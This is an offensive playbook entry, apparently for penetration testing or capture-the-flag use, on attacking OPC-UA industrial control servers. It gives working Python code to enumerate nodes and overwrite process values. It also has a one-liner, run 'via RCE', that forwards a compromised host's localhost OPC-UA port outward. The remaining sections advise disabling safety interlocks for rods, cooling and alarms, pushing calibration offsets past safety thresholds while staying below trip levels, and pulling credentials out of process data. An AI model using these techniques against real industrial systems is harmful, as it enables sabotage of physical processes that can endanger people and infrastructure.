# OPC-UA Value Manipulation

## When to use

- Target runs OPC-UA (typically port 4840) for industrial control systems
- OPC-UA server allows anonymous access or you have valid credentials
- Need to manipulate ICS process values to trigger safety conditions, unlock features, or cause specific behavior

## Tags

- ATT&CK: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)
- Platform: Linux, Windows
- Phase: exploit, postexploit
- Protocol: OPC-UA

## Discovery

OPC-UA servers typically listen on port 4840. Detect with nmap:

```bash
nmap -sV -p 4840 TARGET
# Look for: "OPC-UA" or "opcua" in service/version strings
```

Common OPC-UA implementations:
- **FreeOpcUa** (Python) - common in CTFs and lab environments
- **open62541** (C) - embedded/industrial
- **Prosys** (Java) - commercial
- **Unified Automation** (C++) - commercial

## Connecting with asyncua (Python)

Install: `pip install asyncua`

```python
import asyncio
from asyncua import Client, ua

async def main():
    async with Client(url="opc.tcp://TARGET:4840/") as client:
        # Browse root
        objects = client.get_objects_node()
        children = await objects.get_children()
        for child in children:
            name = await child.read_browse_name()
            print(f"{name.Name} ({child.nodeid})")

asyncio.run(main())
```

## Enumerating nodes

```python
async def browse_recursive(client, node, depth=0, max_depth=4):
    children = await node.get_children()
    for child in children:
        name = await child.read_browse_name()
        nclass = await child.read_node_class()
        val = None
        if nclass == ua.NodeClass.Variable:
            try: val = await child.read_value()
            except: val = "<denied>"
        indent = "  " * depth
        print(f"{indent}{name.Name} ({child.nodeid}) = {val}")
        await browse_recursive(client, child, depth + 1, max_depth)

# Also probe specific namespace IDs directly
for i in range(1, 50):
    try:
        node = client.get_node(f"ns=2;i={i}")
        name = await node.read_browse_name()
        val = await node.read_value()
        print(f"ns=2;i={i}: {name.Name} = {val}")
    except: pass
```

## Writing values

```python
# String
await client.get_node("ns=2;i=12").write_value("MAINTENANCE", ua.VariantType.String)

# Boolean
await client.get_node("ns=2;i=13").write_value(True, ua.VariantType.Boolean)

# Float/Double
await client.get_node("ns=2;i=6").write_value(15.0, ua.VariantType.Double)

# Integer
await client.get_node("ns=2;i=1").write_value(42, ua.VariantType.Int32)
```

Check for write permissions: if `write_value` throws `BadUserAccessDenied`, the node is read-only for your session.

## TCP forwarding for internal OPC-UA

OPC-UA servers often bind to localhost only. Forward through a compromised host:

```python
# Deploy on target via RCE
python3 -c "
import socket,threading,select
def fwd(s,d):
    try:
        while True:
            r,_,_=select.select([s],[],[],60)
            if not r: break
            data=s.recv(65536)
            if not data: break
            d.sendall(data)
    except: pass
    s.close(); d.close()
def handle(c):
    d=socket.socket(); d.connect(('127.0.0.1',4840))
    threading.Thread(target=fwd,args=(c,d),daemon=True).start()
    fwd(d,c)
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',14840)); s.listen(5)
while True:
    c,a=s.accept()
    threading.Thread(target=handle,args=(c,),daemon=True).start()
" &
```

Note: target firewalls may block the forwarded port. If only ports 22 and 80 are open externally, use SSH tunneling instead if you have SSH access.

## Common ICS manipulation patterns

### Triggering safety conditions
Many ICS systems have safety controllers that activate when process values exceed thresholds. Manipulating calibration offsets or mode settings can trigger safety responses without changing actual physical values:

- Set mode to MAINTENANCE/TEST
- Enable test overrides
- Adjust calibration offsets to push effective values past thresholds
- Disable safety interlocks (rods, cooling, alarms)

### Avoiding trips
Safety systems often have two thresholds: warning (triggers maintenance/safety response) and trip (emergency shutdown). Stay between them:
- Warning: triggers the desired behavior (maintenance window, alarm)
- Trip: shuts everything down, resets state

### Reading credentials from process data
Some OPC-UA servers store credentials, API keys, or configuration in node values. Browse all namespaces thoroughly.

## References

- OPC-UA specification: opcfoundation.org
- asyncua documentation: github.com/FreeOpcUa/opcua-asyncio
- ATT&CK for ICS: T0855, T0836, T0831
